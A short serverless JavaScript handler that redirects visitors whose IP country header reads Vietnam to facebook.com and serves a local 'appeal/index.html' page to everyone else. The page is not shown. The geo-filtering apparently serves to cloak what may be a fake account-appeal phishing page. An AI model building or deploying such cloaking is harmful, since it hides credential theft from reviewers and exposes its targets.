export default function handler(req, res) {
  const country = req.headers['x-vercel-ip-country'] || '';
  if (country === 'VN') {
    res.writeHead(302, { Location: 'https://www.facebook.com' });
    res.end();
    return;
  }
  // Not VN — serve index.html
  const fs = require('fs');
  const path = require('path');
  const html = fs.readFileSync(path.join(__dirname, '..', 'appeal', 'index.html'), 'utf-8');
  res.setHeader('Content-Type', 'text/html; charset=utf-8');
  res.end(html);
}
